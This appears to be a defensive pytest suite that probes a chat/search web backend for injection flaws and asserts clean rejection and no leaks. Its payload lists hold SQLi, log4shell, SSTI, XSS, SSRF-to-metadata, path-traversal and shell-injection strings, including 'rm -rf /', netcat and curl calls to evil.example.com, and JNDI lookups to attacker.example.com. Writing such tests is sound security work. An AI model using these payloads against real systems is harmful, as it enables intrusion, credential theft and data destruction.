"""
test_security_injection_deep.py — Deep injection-class security probes.

Complements ``test_10_security.py`` (which covers headers, CSP, CSRF, JWT
plumbing, and SQLi/XSS smokes) by exercising the *inputs* of every endpoint
that takes a user-controlled string and either:

  * stores it (chat title, schedule cron, message content)
  * passes it to a parser (croniter, pyautogui parser)
  * forwards it to a network fetcher (search scraper)
  * uses it to build a filesystem path (file ops)
  * embeds it in a header / response

Categories covered:

  * SQL / NoSQL / log4shell injection on every text input we can reach
  * Stored XSS round-trip on chat title/message + Content-Type defense
  * SSRF on the search endpoint (IMDS, ECS-meta, loopback, file://, @-confusion)
  * Path traversal on file_operations (encoded, NUL-byte, double-encoded)
  * Command injection on /v1/sessions and search query
  * Header injection / response splitting (CRLF in UA / Origin / custom)
  * JSON payload smuggling — duplicate keys, deep nesting, type confusion,
    Unicode-fullwidth normalization bypass

Every test carries ``@pytest.mark.security``. State-writing tests are also
``@pytest.mark.destructive`` and clean up after themselves.

These tests are designed to be SAFE against a live deployment:
  * Path-traversal probes only assert the response is rejected — they never
    expect to receive /etc/passwd contents.
  * SSRF probes assert that loopback/IMDS responses are blocked at request
    time, never that the test framework itself can reach those addresses.
  * Command-injection probes use payloads that would noop on any reasonable
    sanitization — there is no actual `rm -rf /` reaching any shell here.
"""
from __future__ import annotations

import json
import re
from typing import Any, Optional
from urllib.parse import quote, urlencode

import httpx
import pytest

from conftest import assert_status, cfg


# ── Markers ─────────────────────────────────────────────────────────────────
pytestmark = pytest.mark.security


# ───────────────────────────────────────────────────────────────────────────
# Helpers
# ───────────────────────────────────────────────────────────────────────────

def _sec(msg: str, resp: Optional[httpx.Response] = None) -> str:
    """SECURITY:-prefixed assertion message including request/response context."""
    if resp is None:
        return f"SECURITY: {msg}"
    body = ""
    try:
        body = (resp.text or "")[:500].replace("\n", " ")
    except Exception:
        body = "<undecodable>"
    return (
        f"SECURITY: {msg}\n"
        f"  {resp.request.method} {resp.request.url} → {resp.status_code}\n"
        f"  Body: {body}"
    )


def _skip_if_cf_challenge(resp: httpx.Response) -> None:
    if resp.status_code not in (403, 503):
        return
    ct = resp.headers.get("Content-Type", "").lower()
    body = (resp.text or "").lower()
    if "text/html" in ct and "cloudflare" in body and (
        "captcha" in body or "challenge" in body or "just a moment" in body
    ):
        pytest.skip("Cloudflare challenge page — investigate WAF rules")


def _backend(path: str) -> str:
    return f"{cfg().backend_public_url}{path}"


# Forbidden response markers that would indicate a real vulnerability.
# Use these as defense-in-depth: even if a probe gets a 200, the body must
# not contain any of these substrings.
_LEAKY_MARKERS = (
    "Traceback (most recent call last)",
    'File "/home/',
    'File "/app/',
    'File "/usr/',
    "File '/home/",
    "psycopg2",
    "asyncpg",
    "duplicate key value",
    "syntax error at or near",
    "iam-role",                    # IMDS response markers
    "AccessKeyId",
    "SecretAccessKey",
    "SessionToken",
    "instance-id",
    "ami-id",
    "169.254.169.254",
    "ECSContainerMetadataURI",
    "root:x:0:0",                  # /etc/passwd
)


def _assert_no_leaky_markers(resp: httpx.Response, context: str) -> None:
    """Assert the response body contains no internal/IMDS/passwd markers."""
    body = ""
    try:
        body = resp.text or ""
    except Exception:
        return
    for marker in _LEAKY_MARKERS:
        assert marker not in body, _sec(
            f"{context}: response leaked forbidden marker {marker!r}",
            resp,
        )


def _is_clean_rejection(resp: httpx.Response) -> bool:
    """A 'clean' rejection means status is 4xx (NOT 5xx) and body is sane."""
    return 400 <= resp.status_code < 500


# ═══════════════════════════════════════════════════════════════════════════
# SECTION 1 — SQL / NoSQL / Log4Shell injection on text inputs
# ═══════════════════════════════════════════════════════════════════════════

# Curated injection payload bank covering classic SQLi, NoSQL, log4shell,
# template injection, and XSS-as-SQL-payload.
_INJECTION_PAYLOADS = [
    # Classic SQLi
    "';--",
    "' OR 1=1--",
    "' OR '1'='1",
    "1' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "1; DROP TABLE chats;--",
    # Postgres-specific
    "'; SELECT pg_sleep(5);--",
    "'; COPY users TO '/tmp/x';--",
    # NoSQL (MongoDB)
    '{"$ne": null}',
    '{"$where": "this.password == \'x\'"}',
    # JNDI / log4shell
    "${jndi:ldap://attacker.example.com/x}",
    "${jndi:dns://attacker.example.com/x}",
    # SSTI (Jinja/Python)
    "{{7*7}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    # XML / XXE-bait
    "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>",
    # Boolean injection on filters
    "true OR 1=1",
    "1) OR (1=1",
]


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_sqli_chat_search_filter_does_not_500_or_leak(
    http: httpx.Client, auth_headers: dict[str, str], payload: str
):
    """Inject payload into chat-list filter params; never 500, never leak."""
    url = _backend("/api/chats/list")
    # /api/chats/list takes optional machine_id + source query params
    resp = http.get(
        url,
        params={"machine_id": payload, "source": payload, "q": payload, "search": payload},
        headers=auth_headers,
    )
    if resp.status_code in (401, 403):
        pytest.skip("auth not propagated to /api/chats/list — covered elsewhere")

    assert resp.status_code != 500, _sec(
        f"Payload {payload!r} in chat-list filter caused 500 — "
        "possible unhandled exception or query injection",
        resp,
    )
    _assert_no_leaky_markers(resp, f"chat-list filter ({payload!r})")


@pytest.mark.destructive
@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_sqli_chat_title_round_trip_safe(
    http: httpx.Client, auth_headers: dict[str, str], test_user_id: str, payload: str
):
    """Create a chat with an injection payload as title; backend must store
    it as a literal string OR reject it cleanly. Never 500. Never leak."""
    create_url = _backend("/api/chats/create")
    body = {
        "user_id": test_user_id,
        "title": payload,
        "model": "default",
        "source": "post-deploy-test",
    }
    created = http.post(create_url, json=body, headers=auth_headers)

    if created.status_code in (401, 403):
        pytest.skip(f"auth gate fired ({created.status_code})")

    # 500 is the only forbidden outcome — 400/422/200 are all fine
    assert created.status_code != 500, _sec(
        f"Payload {payload!r} in chat title caused 500", created
    )
    _assert_no_leaky_markers(created, f"chat title ({payload!r})")

    # If created, clean up immediately
    if created.status_code in (200, 201):
        try:
            data = created.json()
            chat_id = (data.get("chat") or {}).get("id") or data.get("id")
            if chat_id:
                http.delete(_backend(f"/api/chats/{chat_id}"), headers=auth_headers)
        except Exception:
            pass


@pytest.mark.parametrize("cron_payload", [
    "*/5 * * * *; rm -rf /",
    "*/5 * * * * `whoami`",
    "*/5 * * * * $(whoami)",
    "0 0 * * * | nc evil 80",
    "${jndi:ldap://x.y/z} * * * *",
    "'; DROP TABLE chats;--",
])
def test_schedule_cron_injection_rejected_or_validated(
    http: httpx.Client, auth_headers: dict[str, str], cron_payload: str
):
    """Custom cron expression with shell metacharacters must not 500.

    croniter validation should reject these as 400; backend must NEVER pass
    cron strings to a shell.  We use a fake chat_id so the test doesn't
    create real schedules — auth + ownership check 404s before croniter runs,
    but a 500 from validation would reveal a parser bug or shell pass-through.
    """
    fake_chat_id = "00000000-0000-0000-0000-000000000000"
    url = _backend(f"/api/schedules/{fake_chat_id}")
    resp = http.post(
        url,
        json={
            "frequency": "custom",
            "cron": cron_payload,
            "machineId": "00000000-0000-0000-0000-000000000000",
            "timezone": "UTC",
        },
        headers=auth_headers,
    )
    if resp.status_code in (401, 403):
        pytest.skip("auth gate fired before validation")

    # 400 (invalid cron), 404 (chat not found / machine not found) are fine.
    # 500 means croniter or our handler exploded on user input.
    assert resp.status_code != 500, _sec(
        f"Cron payload {cron_payload!r} caused 500", resp
    )
    _assert_no_leaky_markers(resp, f"cron payload ({cron_payload!r})")


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_search_query_injection_does_not_500_or_leak(
    http: httpx.Client, payload: str
):
    """Search endpoint must not 500 on injection payloads as query string."""
    url = _backend("/api/search/")
    resp = http.post(url, json={"query": payload, "num_results": 1, "enable_scraping": False})
    # 401/403 (auth required), 200 (Google CSE handles it), 400/422 (validation)
    # are all acceptable. 500 is not.
    assert resp.status_code != 500, _sec(
        f"Search query {payload!r} produced 500 — "
        "Google CSE failure leaked or service exception not handled",
        resp,
    )
    _assert_no_leaky_markers(resp, f"search query ({payload!r})")


# ═══════════════════════════════════════════════════════════════════════════
# SECTION 2 — Stored XSS (chat title/message round-trip + content-type)
# ═══════════════════════════════════════════════════════════════════════════

_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # Encoded variants
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    # SVG event handlers
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    # Polyglot
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    # CSS injection
    "<style>@import 'http://attacker.example/x.css';</style>",
    # Bypass attempts
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]


@pytest.mark.destructive
@pytest.mark.parametrize("payload", _XSS_PAYLOADS)
def test_xss_in_chat_title_round_trip_safely(
    http: httpx.Client, auth_headers: dict[str, str], test_user_id: str, payload: str
):
    """POST chat with XSS title → list endpoint must serve JSON (not HTML),
    and the round-trip must not 500 or leak internal state."""
    create_url = _backend("/api/chats/create")
    created = http.post(
        create_url,
        json={
            "user_id": test_user_id,
            "title": payload,
            "model": "default",
            "source": "post-deploy-xss-probe",
        },
        headers=auth_headers,
    )

    if created.status_code in (401, 403):
        pytest.skip("auth not propagated")
    if created.status_code >= 500:
        pytest.fail(_sec(f"XSS title {payload!r} caused 5xx", created))
    if created.status_code not in (200, 201):
        # Backend rejected at validation — that's a perfectly safe outcome.
        return

    chat_id = None
    try:
        data = created.json()
        chat_id = (data.get("chat") or {}).get("id") or data.get("id")

        # Read back via list — confirm Content-Type is JSON, never HTML.
        list_resp = http.get(_backend("/api/chats/list"), headers=auth_headers)
        # 429 means we hit the rate limiter from running parametrized XSS
        # tests in tight succession — that's environmental, not a security
        # finding. The 429 itself proves rate-limiting works, which is
        # asserted in test_10_security.py separately. Still confirm it's
        # not text/html (defense-in-depth even on 429 envelope).
        if list_resp.status_code == 429:
            ct = list_resp.headers.get("Content-Type", "").lower()
            assert "text/html" not in ct, _sec(
                f"Rate-limit 429 served as text/html (Content-Type={ct!r})",
                list_resp,
            )
            return
        assert_status(list_resp, 200)
        ct = list_resp.headers.get("Content-Type", "").lower()
        assert "text/html" not in ct, _sec(
            f"/api/chats/list returned text/html (Content-Type={ct!r}) — "
            f"XSS payload {payload!r} would render as HTML on retrieval",
            list_resp,
        )
        assert ct.startswith("application/json"), _sec(
            f"/api/chats/list non-JSON Content-Type {ct!r}", list_resp
        )

        # Defense-in-depth: even if JSON, body must not contain unescaped
        # HTML special chars *outside* of JSON-escape sequences. JSON escapes
        # `<` as `<` only sometimes — checking that a literal <script>
        # is *not* present without surrounding quotes is too brittle, so we
        # only assert the response is not parseable as HTML.
        assert "<!DOCTYPE html" not in (list_resp.text or "")[:200], _sec(
            f"/api/chats/list looks like HTML — XSS storage path leaks",
            list_resp,
        )
    finally:
        if chat_id:
            try:
                http.delete(_backend(f"/api/chats/{chat_id}"), headers=auth_headers)
            except Exception:
                pass


def test_chats_list_content_type_is_json_defense_in_depth(
    http: httpx.Client, auth_headers: dict[str, str]
):
    """Smoke check: /api/chats/list always responds JSON regardless of input."""
    resp = http.get(
        _backend("/api/chats/list"),
        headers={**auth_headers, "Accept": "text/html,application/xhtml+xml"},
    )
    if resp.status_code in (401, 403):
        pytest.skip("auth gate fired")
    ct = resp.headers.get("Content-Type", "").lower()
    assert ct.startswith("application/json"), _sec(
        f"/api/chats/list returned non-JSON Content-Type {ct!r} — "
        "XSS defense-in-depth fails when client requests text/html",
        resp,
    )


# ═══════════════════════════════════════════════════════════════════════════
# SECTION 3 — SSRF on /api/search/
# ═══════════════════════════════════════════════════════════════════════════
#
# search.py's _scrape_search_results() pulls `result["url"]` from Google CSE
# items and feeds them to WebScraperService.scrape_multiple_urls(). If a
# user-controlled URL bypasses Google CSE (e.g. via a search query that
# returns it as a result), it would be fetched server-side. Even though the
# URL comes from Google CSE in the normal flow, defense-in-depth requires
# that:
#   1. The /api/search/ endpoint itself does not accept a raw URL as `query`
#      and turn around and fetch it.
#   2. If a malicious URL ever lands in result["url"], the scraper rejects
#      private/loopback/metadata addresses.
#
# We can't directly inject URLs into the scraper from this layer (that's a
# unit test concern). What we CAN test post-deploy: the search endpoint
# treats SSRF-shaped queries as plain search text and never produces a 500
# nor a body that contains IMDS/passwd markers (which would imply the
# scraper followed the URL).

_SSRF_TARGETS = [
    # AWS IMDS (v1 + v2)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # ECS task metadata
    "http://169.254.170.2/v2/credentials/",
    "http://169.254.170.2/v3/task",
    # Loopback IPv4 + IPv6
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://localhost/",
    "http://127.0.0.1:8001/api/health",
    # Internal services
    "http://localhost:6379/",          # Redis
    "http://127.0.0.1:5432/",          # Postgres
    # Private ranges (RFC 1918)
    "http://10.0.0.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
    # Schemes other than http(s)
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_FLUSHALL",
    "dict://127.0.0.1:11211/stats",
    # @-confusion userinfo
    "http://google.com@127.0.0.1/",
    "http://google.com@169.254.169.254/latest/meta-data/",
    # URL-encoded variants
    "http://%31%32%37.0.0.1/",
    "http://2130706433/",              # decimal IP for 127.0.0.1
    "http://0x7f000001/",              # hex IP for 127.0.0.1
    # DNS rebinding canary (host that *resolves* to 127.0.0.1 in some configs)
    "http://localtest.me/",
]


@pytest.mark.parametrize("target", _SSRF_TARGETS)
def test_ssrf_target_in_search_query_is_not_fetched(
    http: httpx.Client, target: str
):
    """A search query containing an SSRF URL must not cause the backend to
    fetch the URL. We can detect that by:
      * No 500
      * No IMDS / passwd / internal markers in the response body
      * Reasonable response time (no hung connect to private IP)
    """
    resp = http.post(
        _backend("/api/search/"),
        json={"query": target, "num_results": 1, "enable_scraping": False},
    )
    # search route is gated by InternalAPIKey middleware in some configs;
    # 401/403/422 are all valid rejections. 200 is fine if Google CSE just
    # treated it as text. 500 is the red flag.
    assert resp.status_code != 500, _sec(
        f"SSRF probe {target!r} caused 500 — possible URL parsing failure "
        "or scraper exception leaked",
        resp,
    )
    _assert_no_leaky_markers(resp, f"SSRF target ({target!r})")


@pytest.mark.parametrize("target", [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8001/api/health",
    "file:///etc/passwd",
])
def test_ssrf_response_does_not_contain_private_target_response_body(
    http: httpx.Client, target: str
):
    """Make absolutely sure the response body to a search containing an SSRF
    URL does NOT contain the response body of that URL. This is a strict
    no-leakage check independent of status code."""
    resp = http.post(
        _backend("/api/search/"),
        json={"query": target, "num_results": 1, "enable_scraping": True},
    )
    body = (resp.text or "").lower()
    # Markers that would prove the scraper followed the URL
    forbidden = (
        "iam-role",
        "ami-id",
        "instance-id",
        "accesskeyid",
        "root:x:0:0",
        "/api/health",       # if 127.0.0.1:8001/api/health was actually fetched
    )
    for marker in forbidden:
        assert marker not in body, _sec(
            f"SSRF target {target!r} response body contains marker {marker!r} — "
            "possible blind SSRF",
            resp,
        )


# ═══════════════════════════════════════════════════════════════════════════
# SECTION 4 — Path traversal on /api/files/*
# ═══════════════════════════════════════════════════════════════════════════

_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\Windows\\System32\\config\\SAM",
    # URL-encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # Double URL-encoded
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # Mixed slashes
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    # Unicode/UTF-8 alternative encodings
    "..%c0%afetc%c0%afpasswd",
    # NUL-byte truncation
    "safe.txt\x00../../etc/passwd",
    "safe.txt%00../../etc/passwd",
    # Symlink-escape (assume server canonicalizes — should still reject)
    "/proc/self/environ",
    "/proc/self/root/etc/passwd",
    # Long traversal
    "../" * 30 + "etc/passwd",
]


@pytest.mark.parametrize("path", _TRAVERSAL_PAYLOADS)
def test_path_traversal_on_file_download_rejected(
    http: httpx.Client, auth_headers: dict[str, str], path: str
):
    """File download endpoint must reject traversal payloads with 4xx and
    must never serve /etc/passwd contents."""
    url = _backend("/api/files/download")
    # Use a fake machine_id so we don't actually traverse a real machine —
    # we only want to confirm the route validates inputs cleanly.
    resp = http.post(
        url,
        json={
            "machine_id": "local-fake-machine",
            "filepath": path,
            "encoding": "utf-8",
        },
        headers=auth_headers,
    )
    if resp.status_code in (401, 403):
        pytest.skip("auth gate fired before path validation")

    # Acceptable: 400 (validation), 404 (machine not found), 503 (cannot connect),
    # 500 IS suspicious — it could mean the path triggered a Python exception
    # in the validator. We allow 500 only when body contains no leak markers.
    if resp.status_code == 500:
        # Verify the 500 isn't leaking the /etc/passwd content
        _assert_no_leaky_markers(resp, f"path traversal ({path!r})")
        # And also doesn't echo the path back (defense in depth)
        body = resp.text or ""
        assert "root:x:0:0" not in body, _sec(
            f"Path traversal {path!r} 500-response leaked /etc/passwd content",
            resp,
        )
    else:
        # Any non-500 with no leak markers is acceptable
        _assert_no_leaky_markers(resp, f"path traversal ({path!r})")


@pytest.mark.parametrize("path", _TRAVERSAL_PAYLOADS)
def test_path_traversal_on_create_folder_rejected(
    http: httpx.Client, auth_headers: dict[str, str], path: str
):
    """Folder-create endpoint with traversal payload must not 500 and must
    not let us create a folder outside the user's sandbox."""
    url = _backend("/api/files/create-folder")
    resp = http.post(
        url,
        json={
            "machine_id": "local-fake-machine",
            "folderpath": path,
        },
        headers=auth_headers,
    )
    if resp.status_code in (401, 403):
        pytest.skip("auth gate fired")

    # The route uses shlex.quote; combined with auth/ownership checks it should
    # 4xx cleanly. 500 with /home/ paths in body would be a leak.
    _assert_no_leaky_markers(resp, f"folder-create path ({path!r})")


# ═══════════════════════════════════════════════════════════════════════════
# SECTION 5 — Command injection
# ═══════════════════════════════════════════════════════════════════════════

_CMD_INJECTION_PAYLOADS = [
    "; rm -rf /",
    "&& cat /etc/passwd",
    "$(whoami)",
    "`whoami`",
    "| nc evil.example.com 80",
    "& curl http://evil.example.com",
    "; ping -c 1 169.254.169.254",
    "$(curl -s http://169.254.169.254/latest/meta-data/)",
    # Shell substitution variants
    "test;ls",
    "test\nls",
    "test\rls",
    "test\x00ls",
    # PowerShell (Windows)
    "test; Get-ChildItem",
    "test`nGet-ChildItem",
]


@pytest.mark.parametrize("payload", _CMD_INJECTION_PAYLOADS)
def test_cmd_injection_in_search_query_safe(http: httpx.Client, payload: str):
    """Search query with shell metacharacters must not 500 — Google CSE
    treats them as text; backend must not pass query to any shell."""
    resp = http.post(
        _backend("/api/search/"),
        json={"query": payload, "num_results": 1, "enable_scraping": False},
    )
    assert resp.status_code != 500, _sec(
        f"Command-injection query {payload!r} caused 500 — possible shell pass-through",
        resp,
    )
    _assert_no_leaky_markers(resp, f"cmd injection in query ({payload!r})")


@pytest.mark.parametrize("payload", _CMD_INJECTION_PAYLOADS)
def test_cmd_injection_in_public_cua_session_instruction_safe(
    http: httpx.Client, payload: str
):
    """The public CUA /v1/sessions endpoint accepts user instructions; those
    must never reach a shell, even if a parser fails on them."""
    # /api/v1/cua/sessions requires X-API-Key — without one we should get 401,
    # which still means the route validated headers BEFORE running any user
    # input through a parser. Either way: never 500.
    resp = http.post(
        _backend("/api/v1/cua/sessions"),
        json={
            "cua_version": "v3",
            "model": "default",
            "screen_width": 1920,
            "screen_height": 1080,
            "system_prompt": payload,
        },
    )
    assert resp.status_code != 500, _sec(
        f"CUA session create with payload {payload!r} caused 500 — "
        "user input may be reaching a parser/shell unsafely",
        resp,
    )
    _assert_no_leaky_markers(resp, f"public CUA payload ({payload!r})")


# ═══════════════════════════════════════════════════════════════════════════
# SECTION 6 — Header injection / response splitting
# ═══════════════════════════════════════════════════════════════════════════

@pytest.mark.parametrize("header_name", ["User-Agent", "Origin", "X-Custom-Probe", "Referer"])
@pytest.mark.parametrize("crlf_payload", [
    "value\r\nX-Injected-Header: pwned",
    "value\nSet-Cookie: pwned=1",
    "value\r\n\r\n<html>injected</html>",
    "value%0d%0aX-Injected: pwned",   # URL-encoded
    "value%0aX-Injected: pwned",
])
def test_crlf_header_injection_does_not_split_response(
    http: httpx.Client, header_name: str, crlf_payload: str
):
    """A CRLF-laden header value must not result in injected response headers
    or a multi-response split. httpx will raise on raw CR/LF in headers,
    so we URL-encode the payload at the test level — but the URL-encoded
    `%0d%0a` form must also not be unescaped by the server."""
    # httpx will reject the literal \r\n at send time; that itself proves the
    # client lib defends against the simplest form of this attack. For URL-
    # encoded variants, the server must not decode them into real CRLFs.
    # We catch:
    #   - LocalProtocolError / InvalidURL / ValueError: httpx refuses to send
    #   - RemoteProtocolError: server (ALB/Cloudflare) reset the connection
    #     because of the malformed header — also a perfectly valid defense.
    #   - HTTPError: catch-all for any other connection-level rejection
    url = _backend("/api/health")
    try:
        resp = http.get(url, headers={header_name: crlf_payload})
    except (
        httpx.LocalProtocolError,
        httpx.RemoteProtocolError,
        httpx.InvalidURL,
        httpx.ConnectError,
        httpx.ReadError,
        ValueError,
    ):
        # httpx or the server refused the literal CRLF — that's an immediate pass.
        return

    # If we got here, the payload was URL-encoded and httpx sent it.
    # The server must not have echoed an injected header.
    assert "X-Injected-Header" not in resp.headers, _sec(
        f"Server reflected injected header from {header_name}={crlf_payload!r}",
        resp,
    )
    assert "X-Injected" not in resp.headers, _sec(
        f"Server reflected injected header from {header_name}={crlf_payload!r}",
        resp,
    )
    # And no rogue Set-Cookie
    set_cookie = (resp.headers.get("Set-Cookie") or "").lower()
    assert "pwned" not in set_cookie, _sec(
        f"Server reflected Set-Cookie from {header_name}={crlf_payload!r}",
        resp,
    )


def test_extremely_long_header_rejected_or_truncated(http: httpx.Client):
    """An 8KB User-Agent must not crash the backend or appear in echoed errors."""
    long_ua = "A" * 8192
    try:
        resp = http.get(_backend("/api/health"), headers={"User-Agent": long_ua})
    except httpx.HTTPError as e:
        # ALB may simply close the connection (which httpx surfaces as an error).
        # That's an acceptable defense.
        return

    # If accepted, must respond cleanly (200 or 4xx) — not 500.
    assert resp.status_code != 500, _sec(
        "8KB User-Agent caused 500 — possible header parser bug",
        resp,
    )
    _assert_no_leaky_markers(resp, "8KB User-Agent")


# ═══════════════════════════════════════════════════════════════════════════
# SECTION 7 — JSON / payload smuggling
# ═══════════════════════════════════════════════════════════════════════════

def test_duplicate_keys_in_json_does_not_privilege_escalate(
    http: httpx.Client, auth_headers: dict[str, str]
):
    """JSON with duplicate keys must not let a later `role: admin` override
    an earlier `role: user`. We send the body as raw bytes since json.dumps
    won't produce duplicates."""
    raw = b'{"user_id":"00000000-0000-0000-0000-000000000000",' \
          b'"title":"probe","title":"<script>x</script>",' \
          b'"model":"default","model":"admin","source":"electron"}'
    resp = http.post(
        _backend("/api/chats/create"),
        content=raw,
        headers={**auth_headers, "Content-Type": "application/json"},
    )
    if resp.status_code in (401, 403):
        pytest.skip("auth gate fired")
    # 200/400/422 all fine; 500 is bad.
    assert resp.status_code != 500, _sec(
        "Duplicate JSON keys caused 500 — parser may pick the wrong value",
        resp,
    )
    # Cleanup if accidentally created
    if resp.status_code in (200, 201):
        try:
            data = resp.json()
            chat_id = (data.get("chat") or {}).get("id") or data.get("id")
            if chat_id:
                http.delete(_backend(f"/api/chats/{chat_id}"), headers=auth_headers)
        except Exception:
            pass


def test_deeply_nested_json_does_not_crash(http: httpx.Client, auth_headers: dict[str, str]):
    """1000-level deep nested JSON object must not crash the backend.

    Most JSON libs default to ~recursion depth 200; FastAPI/Pydantic should
    reject this with 400/422, never crash."""
    # Build {"a": {"a": {... 1000 times ...}}}
    nested = "x"
    for _ in range(1000):
        nested = "{\"a\":" + nested + "}"
    raw = nested.encode()
    try:
        resp = http.post(
            _backend("/api/chats/create"),
            content=raw,
            headers={**auth_headers, "Content-Type": "application/json"},
            timeout=10,
        )
    except httpx.HTTPError:
        # Connection reset under heavy parser load is not great but not a leak.
        return

    assert resp.status_code != 500 or _is_clean_rejection(resp), _sec(
        "1000-deep JSON triggered 500 with no clean rejection",
        resp,
    )
    # Whatever happened, body must not contain a Python recursion-depth trace.
    _assert_no_leaky_markers(resp, "deeply nested JSON")


def test_json_array_bomb_does_not_hang(http: httpx.Client, auth_headers: dict[str, str]):
    """A very large JSON array (10MB of ints) must be either rejected fast
    or parsed without OOM."""
    huge = b"[" + b"1," * 200_000 + b"1]"  # ~600KB of array
    try:
        resp = http.post(
            _backend("/api/chats/create"),
            content=huge,
            headers={**auth_headers, "Content-Type": "application/json"},
            timeout=10,
        )
    except httpx.HTTPError:
        return  # connection rejected = defense

    assert resp.status_code != 500 or resp.status_code in (413, 400, 422), _sec(
        "Large JSON array crashed the backend (5xx without clean rejection)",
        resp,
    )


@pytest.mark.parametrize("body", [
    # Type confusion: array where dict expected
    b'[]',
    # null where dict expected
    b'null',
    # integer where string expected (title field)
    b'{"user_id":"00000000-0000-0000-0000-000000000000","title":12345}',
    # Boolean where string expected
    b'{"user_id":"00000000-0000-0000-0000-000000000000","title":true}',
    # Nested object where string expected
    b'{"user_id":"00000000-0000-0000-0000-000000000000","title":{"$nin":["a"]}}',
])
def test_type_confusion_in_chat_body_rejected_cleanly(
    http: httpx.Client, auth_headers: dict[str, str], body: bytes
):
    """Pydantic should reject type-confused bodies with 400/422, never 500."""
    resp = http.post(
        _backend("/api/chats/create"),
        content=body,
        headers={**auth_headers, "Content-Type": "application/json"},
    )
    if resp.status_code in (401, 403):
        pytest.skip("auth gate fired")

    assert resp.status_code != 500, _sec(
        f"Type-confused body {body!r} caused 500 — Pydantic validation may be bypassed",
        resp,
    )
    _assert_no_leaky_markers(resp, f"type-confused body ({body!r})")


@pytest.mark.parametrize("payload", [
    # Fullwidth letters — Unicode normalization should NOT fold these into ASCII
    "Ｓcript",                  # Ｓcript
    "jаvascript:alert(1)",     # Cyrillic 'a'
    "źcript",                  # ź
    # RLO override
    "‮script‭:alert(1)",
    # Zero-width space inside script tag
    "<scr​ipt>alert(1)</scr​ipt>",
])
def test_unicode_normalization_does_not_unmask_xss(
    http: httpx.Client, auth_headers: dict[str, str], test_user_id: str, payload: str
):
    """Sending fullwidth/Cyrillic/zero-width variants must not get normalized
    into a literal `<script>` server-side. Either reject or store as literal."""
    resp = http.post(
        _backend("/api/chats/create"),
        json={
            "user_id": test_user_id,
            "title": payload,
            "model": "default",
            "source": "post-deploy-unicode",
        },
        headers=auth_headers,
    )
    if resp.status_code in (401, 403):
        pytest.skip("auth gate fired")
    assert resp.status_code != 500, _sec(
        f"Unicode payload {payload!r} caused 500", resp
    )

    # If created, the title in the response must not have been folded into
    # ASCII `<script>`.
    if resp.status_code in (200, 201):
        chat_id = None
        try:
            data = resp.json()
            chat = data.get("chat") or {}
            chat_id = chat.get("id") or data.get("id")
            stored_title = chat.get("title", "")
            # A naive NFKC normalize would turn "Ｓcript" into "Script" — if that
            # happened plus an unsafe HTML render upstream, it's an XSS bypass.
            # We assert the stored title preserves the original codepoint OR
            # has been HTML-escaped. The literal lowercase "<script>" must
            # never appear (which would prove harmful normalization).
            assert "<script>" not in stored_title.lower(), _sec(
                f"Unicode payload {payload!r} normalized into '<script>' on server "
                f"(stored title: {stored_title!r}) — XSS bypass via normalization",
                resp,
            )
        except (ValueError, KeyError, AttributeError):
            pass
        finally:
            if chat_id:
                try:
                    http.delete(_backend(f"/api/chats/{chat_id}"), headers=auth_headers)
                except Exception:
                    pass
